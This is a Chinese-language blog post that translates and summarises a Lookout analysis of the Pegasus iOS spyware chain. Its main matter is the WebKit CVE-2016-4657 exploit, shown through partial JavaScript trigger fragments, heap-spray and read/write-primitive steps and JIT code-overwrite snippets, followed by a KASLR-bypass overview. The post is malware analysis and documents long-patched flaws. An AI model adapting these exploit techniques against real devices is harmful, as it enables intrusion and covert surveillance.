<!DOCTYPE HTML>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>pegasus分析 | FINSENTY54</title>
  <meta name="author" content="finsenty54">
  
  <meta name="description" content="翻译下内容">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="pegasus分析">
  <meta property="og:site_name" content="FINSENTY54">

  
    <meta property="og:image" content>
  

  
    <link rel="alternative" href="/atom.xml" title="FINSENTY54" type="application/atom+xml">
  
  
    <link href="/[object Object]" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-135283153-1', 'auto');
  ga('send', 'pageview');
</script>




</head>
</html>
 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">FINSENTY54</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/rss" title="Subscribe me.">
			  <i class="fa fa-user"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> pegasus分析</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  
		 <div class="alert alert-success description">
			<i class="fa fa-info-circle"></i> 翻译下内容
		 </div> <!-- alert -->
	  		

	  <h1 id="PEGASUS攻击分析"><a href="#PEGASUS攻击分析" class="headerlink" title="PEGASUS攻击分析"></a>PEGASUS攻击分析</h1><h6 id="参考-lookout-report"><a href="#参考-lookout-report" class="headerlink" title="参考 lookout report"></a>参考 <a href="https://info.lookout.com/rs/051-ESQ-475/images/pegasus-exploits-technical-details.pdf" title="lookout report" target="_blank" rel="noopener">lookout report</a></h6><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>受害者点击链接之后，攻击者展开攻击。攻击分为三个阶段，每个阶段都包含了攻击模块代码和隐蔽软件。攻击是线性的，每个阶段都依赖于上个阶段的代码、隐蔽软件的成功，每个阶段都使用了关键的0day漏洞，以确保进攻成功进行。</p>
<h5 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h5><p>传送并利用WebKit漏洞，通过HTML文件利用WebKit中的CVE-2016-4657漏洞。</p>
<h5 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h5><p>越狱。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对iOS内核两个漏洞(CVE-2016-4655和CVE-2016-4656)的exp还有一个用来下载解密第三阶段软件包的loader。</p>
<h5 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h5><p>安装间谍软件。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把hook安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如ssh。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。</p>
<p>第三阶段中，间谍会部署一个test222.tar文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的根TLS证书、针对Viber、Whatsapp的嗅探库、专门用于通话录音的库等。</p>
<h2 id="CVE-2016-4657"><a href="#CVE-2016-4657" class="headerlink" title="CVE-2016-4657"></a>CVE-2016-4657</h2><p>第一阶段用到了<strong>WebKit’s JavaScriptCore library</strong> 中的漏洞<strong>CVE-2016-4657</strong>。让Safari运行一段JavaScript payload，以此来获得Safari WebContent进程的代码执行权。</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>MarkedArgumentBuffer中的<strong>slowAppend()</strong>函数中存在这个漏洞，并且可以在静态方法<strong>definePropertries()</strong>中使用MarkedArgumentBuffer来利用这个漏洞。definePropertries()接受一个对象，这个对象的可枚举变量构成要在另一个目标对象上定义或修改的属性的描述符。算法链接这些变量和目标对象，基于变量列表进行两次迭代。在第一个部分，检查每个变量的格式，并创建一个有默认值的PropertyDescriptor对象。<br> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">size_t numProperties = propertyName.size();</span><br><span class="line">Vector&lt;PropertyDescriptor&gt; descriptors;</span><br><span class="line">MarkedArgumentBuffer markBuffer;</span><br><span class="line"><span class="keyword">for</span>(size_t i =<span class="number">0</span>;i&lt;numProperties;i++)&#123;</span><br><span class="line">	JSValue prop = properties-&gt;<span class="keyword">get</span>(exec,propertyNames[i]);</span><br><span class="line">	if(exec-&gt;hadException())</span><br><span class="line">		return jsNull();</span><br><span class="line">	PropertyDescriptor descriptor;</span><br><span class="line">	if(!toPropertyDescriptor(exec, prop,descriptor))</span><br><span class="line">		return jsNull();</span><br><span class="line">	descriptors.append(descriptor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果每一个变量都是有效的，那么第二部分就会执行。这个部分将用户提供的属性变量与目标对象结合在一起，通过defineOwnProperty()实现。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(size_t i=<span class="number">0</span>;i&lt;numProperties; i++)&#123;</span><br><span class="line">	Identifier propertyName = propertyNames[i];</span><br><span class="line">	<span class="keyword">if</span>(exec-&gt;propertyName().isPrivateName(properName))</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	object-&gt;methodTable(exec-&gt;vm())-&gt;defineOwnProperty(object, exec, propertyName,descriptors[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法可能调用用户自定义的JavaScript方法（使用已定义的属性）。这样，内存回收会被触发，导致未标记的堆备份重新分配。因此，对descriptor向量PropertyDescriptor存储的对象的引用要独立标记，确保不被回收。这里，使用了<strong>MarkedArgumentBuffer</strong>，临时存储变量值，防止被回收。</p>
<p>首先，来理解JavaScriptCore的垃圾回收机制，当对象不在被使用，或者WebContentjin进程占用更多内存的时候会回收内存。系统会遍历栈，确定对象是否被引用。堆中也可能引用对象，但只在特殊情况中。</p>
<p>MarkedArgumentBuffer维持一个<strong>inline</strong>栈表，由各个值组成。但进行垃圾回收时，每个值会被标记，其代表的对象就会避免回收释放。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarkedArgumentBuffer</span> </span>&#123;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">		<span class="keyword">static</span> <span class="keyword">const</span> size_t inlineCapacity=<span class="number">8</span>;</span><br><span class="line">	...</span><br><span class="line">	public:</span><br><span class="line">	...</span><br><span class="line">		MarkedArgumentBuffer()</span><br><span class="line">			:m_size(<span class="number">0</span>)</span><br><span class="line">			,m_capacity(inlineCapacity)</span><br><span class="line">			,m_buffer(m_inlineBuffer)</span><br><span class="line">			,m_markSet(<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	...</span><br><span class="line">		<span class="keyword">void</span> append(JSValue v)&#123;</span><br><span class="line">		<span class="keyword">if</span>(m_size &gt;= m_capacity)</span><br><span class="line">			<span class="keyword">return</span> slowAppend(v);</span><br><span class="line">		</span><br><span class="line">		slotFor(m_size)=JSValue::encode(v);</span><br><span class="line">		++m_size;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">	...</span><br><span class="line">		int m_size;</span><br><span class="line">		int m_capacity;</span><br><span class="line">		EncodedJSValue m_inlineBuffer[inlineCapacity];</span><br><span class="line">		EncodeedJSValue* m_buffer;</span><br><span class="line">		ListSet* m_markSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>inline栈只能存8个值。当向MarkedArgumentBuffer添加第九个值时，就移到堆中，能够存储的值也扩大了。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MarkedArgumentBuffer::slowAppend(JSValue v)&#123;</span><br><span class="line">	int newCapacity = m_capacity*<span class="number">4</span>;</span><br><span class="line">	EncodedJSValue* newBuffer = <span class="keyword">new</span> EncodeedJSValue[newCapacity];</span><br><span class="line">	<span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;m_capacity;++i)</span><br><span class="line">		newBuffer[i]=m_buffer[i];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (EncodedJSValue* base=mallocBase())</span><br><span class="line">		<span class="keyword">delete</span> [] base;</span><br><span class="line">	</span><br><span class="line">	m_buffer=newBuffer;</span><br><span class="line">	m_capacity=newCapacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>一旦移动到堆中，这些值就不再被垃圾回收机制保护。MarkedArgumentBuffer里的值会添加到堆中的<strong>m_markListSet</strong>并被标记，确保不会释放回收。当MarkedArgumentBuffer移到堆中时，也要移动<strong>markListSet</strong>中。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//As long as our size stays within our Vetor's inline</span></span><br><span class="line"><span class="comment">//capacity, all our values are allocated on the stack, and </span></span><br><span class="line"><span class="comment">//therefore don't need explicit marking. Once our size exceeds </span></span><br><span class="line"><span class="comment">//our Vector's inline capacity, though, our values move to the </span></span><br><span class="line"><span class="comment">//heap, where they do need explicit marking.</span></span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span>; i&lt;m_size;++i)&#123;</span><br><span class="line">	Heap* heap=Heap::heap(JSValue::decode(slotFor(i)));</span><br><span class="line">	<span class="keyword">if</span>(!heap)</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	m_markSet = &amp;heap-&gt;markListSet();</span><br><span class="line">	m_markSet-&gt;add(<span class="keyword">this</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面的代码请求了一个堆，把MarkedArgumentBuffer添加到堆中的markListSet。但只有第九个值加入MarkedArgumentBuffer才调用。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inline Heap* Heap::heap(<span class="keyword">const</span> JSValue v)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!v.isCell())</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> heap(v.asCell());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>JSValue</strong>有一个tag，说明它编码的值的类型。在一个复杂的对象中，tag为CellTag，JSValue创建一指针指向堆中的值。对简单类型来说，变量可以直接解码成JSValue（例如整形，布尔型，null，还有未定义的），在堆中存储这样的值是多余的，还会创建一个tag。<strong>JSValue::isCell() </strong>函数决定是否在堆中创建指针指向单元格。因为简单类型不会指向堆，为这些类型指定堆没有意义，只会返回null。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inline bool JSValue::isCell() <span class="keyword">const</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(u.asInt64&amp;TagMask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>因此，如果要添加到MarkedArgumentBuffer的第九个值不是一个堆备份值，当请求堆时会返回NULL， MarkedArgumentBuffer也不会添加到堆markListSet中。MarkedArgumentBuffer就不在起作用，第九个值以后的值可以被释放回收。descriptor向量里的堆值，被引用后，可能会被污染。实际上，对这些值的另一个引用仍然存在（defineDescriptor()有JavaScript的变量）。在垃圾回收前，余下的JSValue的引用必须先移去，以使descriptor向量里的引用被污染。<br><a href="https://imgchr.com/i/ESiMgf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/18/ESiMgf.png" alt="ESiMgf.png"></a><br>调用defineOwnDescriptor()一定会调用基于属性值的用户控制的方法。结果，最后一个对一属性值的引用可以被用户定义的JavaScript代码移去。如果垃圾回收在移去一特定值的所有引用和目标对象desceiptor向量里的值时被触发，这些释放了的空间会作为一个变量存储在目标对象上。</p>
<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>Pegasus通过向defineProperties()函数传入一系列精心制作的变量来触发这个漏洞。当这些独立变量连续添加到MarkedArgumentBuffer，这个漏洞就会触发，如果垃圾回收在关键时候及时触发，JSArray会错误释放。因为垃圾回收不一定会被触发，所以重复攻击以触发错误释放和再分配（会尝试十次），还会测试是否一个被污染的引用已经成功获得。假设垃圾回收正确触发，那么另一个对象就会分配在污染的JSArray之上。接着，设置可以获得本地代码执行权的工具，即读写权限，获取任意JavaScript对象位置。一旦这些步骤都完成了，就会创建一个payload可执行代码集。</p>
<h5 id="设置触发漏洞"><a href="#设置触发漏洞" class="headerlink" title="设置触发漏洞"></a>设置触发漏洞</h5><p>攻击使用一个JSArray对象触发漏洞代码块，获得任意代码执行权。下面这段代码触发漏洞。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2047</span>);</span><br><span class="line"><span class="keyword">var</span> not_number=&#123;&#125;;</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	arr=<span class="literal">null</span>;</span><br><span class="line">	props[<span class="string">"stale"</span>][<span class="string">'value'</span>]=<span class="literal">null</span>;</span><br><span class="line">	...<span class="comment">//Trigger garbage collection and reallocation over stale object</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> props=&#123;</span><br><span class="line">	p0:&#123;<span class="attr">value</span>:<span class="number">0</span>&#125;,</span><br><span class="line">	p1:&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	p2:&#123;<span class="attr">value</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	p3:&#123;<span class="attr">value</span>:<span class="number">3</span>&#125;,</span><br><span class="line">	p4:&#123;<span class="attr">value</span>:<span class="number">4</span>&#125;,</span><br><span class="line">	p5:&#123;<span class="attr">value</span>:<span class="number">5</span>&#125;,</span><br><span class="line">	p6:&#123;<span class="attr">value</span>:<span class="number">6</span>&#125;,</span><br><span class="line">	p7:&#123;<span class="attr">value</span>:<span class="number">7</span>&#125;,</span><br><span class="line">	p8:&#123;<span class="attr">value</span>:<span class="number">8</span>&#125;,</span><br><span class="line">	length:&#123;<span class="attr">value</span>:not_number&#125;,</span><br><span class="line">	stale:&#123;<span class="attr">value</span>:arr&#125;,</span><br><span class="line">	after:&#123;<span class="attr">value</span>:<span class="number">666</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> target=[];</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br></pre></td></tr></table></figure></p>
<p>经过特别精心编排的props对象触发slowAppend()内的漏洞。当第九个属性值添加到MarkedArgumentBuffer(P8)，slowAppend()将无法获得堆地址（因为这个值是一个简单类型，即整形，并且原先堆上没有这个值）。那么，MarkedArgumentBuffer就不能保护堆备份值（not_number和arr），当垃圾回收时就会被释放。</p>
<p>当defineOwnDescriptor()接受这个长属性值，它会尝试将这个值（not_number）转变为一个数字。如下所示，toString()被调用，移去arr的后两项引用。一旦移去，JSArray将取消标记，下一次垃圾回收就会释放整个对象。Pegasus通过toString()方法申请分配内存空间，促使垃圾回收运行（释放arr对象）。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempts=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4250000</span>);</span><br><span class="line"><span class="keyword">var</span> pressure=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line">...</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;pressure.length;i++)&#123;</span><br><span class="line">		pressure[i]=<span class="keyword">new</span> Unit32Array(<span class="number">262144</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> buffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">80</span>);</span><br><span class="line">	<span class="keyword">var</span> unitArray=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	unitArray[<span class="number">0</span>]=<span class="number">0xAABBCCDD</span>;</span><br><span class="line">	<span class="keyword">for</span>(i =<span class="number">0</span>;i&lt;attempts.length;i++)&#123;</span><br><span class="line">		attempts[i]=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>attempts每一项都在同一段缓冲区上分配4.25 million个Unit32Array。在arr对象使用的同一内存区再分配一系列的Unit32Array。</p>
<p>完成后，会检测垃圾回收是否触发。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> before_len=arr.length;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br><span class="line">stale=targets.stale;</span><br><span class="line"><span class="keyword">var</span> after_len=stale.length;</span><br><span class="line"><span class="keyword">if</span>(before_len==after_len)&#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> RecoverableException(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果JSArray的长度没有改变，要么垃圾回收没有触发，要么是Unit32Array没有在stale相同地址上分配空间。这种情况，攻击就失败了，但会再尝试。</p>
<h4 id="获取任意读写原语"><a href="#获取任意读写原语" class="headerlink" title="获取任意读写原语"></a>获取任意读写原语</h4><p>假设攻击已经成功了，那么在同一段的内存中有两个不同类型的对象。第一个是JSArray(已污染)，第二个是众多已分配的Unit32Arrays中的一个（实际上，默认类型是 JSGenericTypedArrayView）。通过对污染对象的读写，可以读取或破环JSGenericTypedArrayView的成员变量。特别地，在JSArray和JSGenericTypedArrayView长度重叠的地方，写入一个偏移量，就可以有效地设置Unit32Array的长度为0xFFFFFFFF。破环这个值，可以将这个array作为WebContent进程的全部虚拟地址空间（即任意读写原语）。</p>
<p>攻击需要确定已分配的众多Unit32Array中哪一个与污染对象匹配。可以一一测试，并检查长度是否被改为0xFFFFFFFF。所有其他数组仍将保留原始的备份ArrayBuffer。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(x=attempts.length<span class="number">-1</span>;x&gt;=<span class="number">1</span>;x--)&#123;</span><br><span class="line">	<span class="keyword">if</span>(attempts[x].length != <span class="number">80</span>/<span class="number">4</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(attempts[x].length==<span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">			memory_view=attempts[x];</span><br><span class="line">			...</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="获取对象地址"><a href="#获取对象地址" class="headerlink" title="获取对象地址"></a>获取对象地址</h4><p>完成攻击的最后组件需要能够获取任意JavaScript对象的地址。Pegasus用破坏Unit32Array的方法来获取地址。向对象写入一偏移值，Unit32Array的缓冲区就被破坏，并指向用户控制的JSArray。JSArray的第一个元素设置成需要爆破的JavaScript对象（通过损坏指向uint32数组的底层存储的指针），可以从Unit32Array中读取地址信息。</p>
<h4 id="本地代码执行"><a href="#本地代码执行" class="headerlink" title="本地代码执行"></a>本地代码执行</h4><p>Pegasus第一段段余下要做的是创建一个可执行代码集，这个集合包含了要被执行的恶意代码。创建一个JSFunction对象（包含上百个之后会被重写的try/catch块）完成这项工作。为确保JIT编译成本机代码，这个函数会被重复调用。这样，这个函数会被标记为会经常调用并不会释放的高优先级代码。因为JavaScriptCode编译器运行JSTed代码的独特方式，代码会存储在可以读写运行的内存区。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body=<span class="string">' '</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k=<span class="number">0</span>;k&lt;<span class="number">0x600</span>;k++)&#123;</span><br><span class="line">	body+=<span class="string">'try &#123;&#125; catch(e);'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> to_overwrite=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>,body);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">	to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以获得JSFunction对象的地址，并且通过读取不同的成员变量，可以获得RWX的映射。接着JSFed的try/catch块会被恶意代码替换。通过调用to_overwrite()函数，可以轻松取得任意代码执行权。</p>
<h4 id="回避检测"><a href="#回避检测" class="headerlink" title="回避检测"></a>回避检测</h4><p>当攻击失败，Pegasus有一个紧急拯救代码，很可能是创建内核崩溃转储而防止暴露这个漏洞。代码在一个空引用上触发崩溃。当分析师分析这样的情况会马上认为这个BUG为非法空指针引用而不会怀疑是恶意攻击。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>._proto_._proto_=<span class="literal">null</span>;</span><br><span class="line">x=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">"a"</span>);</span><br><span class="line">x._proto_._proto_._proto_=<span class="built_in">window</span>;</span><br><span class="line">x.Audio;</span><br></pre></td></tr></table></figure></p>
<p>##绕过KASLR</p>
<p>###注入的第二阶段：内核位置泄露</p>
<p>第二阶段依靠一个内核信息泄露漏洞（CVE-2016-4655），为接下来实现越狱的内核存储污染漏洞（CVE-2016-4656）做准备。</p>
<h3 id="分析KASLR绕过"><a href="#分析KASLR绕过" class="headerlink" title="分析KASLR绕过"></a>分析KASLR绕过</h3><p>阶段二进行提权，为iphone越狱做准备。Pegasus准备了两套方案。方案一为IOS内核爆破。方案二为找出已经越狱的iphone（已经安装了后门程序），利用已存在的后门来安装Pegasus的内核补丁包。</p>
<p>首先，必须确定内核在内存中的位置，提升自己的权限，解除保护机制，然后安装越狱软件。为了波及更多iphone，Pegasus准备了32位和64位的包。这两个包可以波及大约19个iPhone版本。阶段二的变种在设计上有许多的相似性，但各自的目的不同，所以最好相关又隔离地看待变种。接下来会讲解阶段二变体的每一个部分，并且会指出变种相似的地方。</p>
<h4 id="32位和63位二进制包不同的地方"><a href="#32位和63位二进制包不同的地方" class="headerlink" title="32位和63位二进制包不同的地方"></a>32位和63位二进制包不同的地方</h4><p>32位包应用于老款的iPhone（iPhone4s–iPhone5c），目标版本为IOS 9.0到IOS 9.3.3。64位应用于新款iPhone（iPhone5s–最新款），目标版本也是IOS 9.0到IOS 9.3.3。两个二进制包执行类似的步骤，利用相同的漏洞。但是，利用漏洞的方式因版本的不同而不同。在运行机制不同的地方，进行分别各自的处理。</p>
<h4 id="加载API"><a href="#加载API" class="headerlink" title="加载API"></a>加载API</h4><p>想要阶段二成功，需要获得大量的API函数。为保证函数可用，阶段二通过<strong>dlsym</strong>动态加载需要的API地址。虽然动态读取API地址在恶意软件上很常见，但有趣的是制作者多次重复加载许多的API函数。仅在<strong>main</strong>函数上，加载了大量的API地址，但只使用一小部分的API（例如，<strong>socket</strong>函数加载到了内存中，却一直没有使用）。在加载了初期的API函数后，32位包调用了一个子进程（初始化），这个进程又会轮流调用其他几个子进程，每个进程负责加载其他的API函数，除此之外，执行不同的启动项任务。</p>
<p>分类加载API函数（哪个阶段二函数会加载哪个API函数），还有重复加载大量API，表明加载API是一些独立组件或者操作独有的。例如，一些函数负责解压越狱文件，利用<strong>chmod</strong>改变权限，将文件放在受害者iPhone上正确的地方。一个独立函数会加载执行这些操作的API函数。这个函数只会加载那些有用的API，而这些API不会和阶段二其他部分共享。</p>
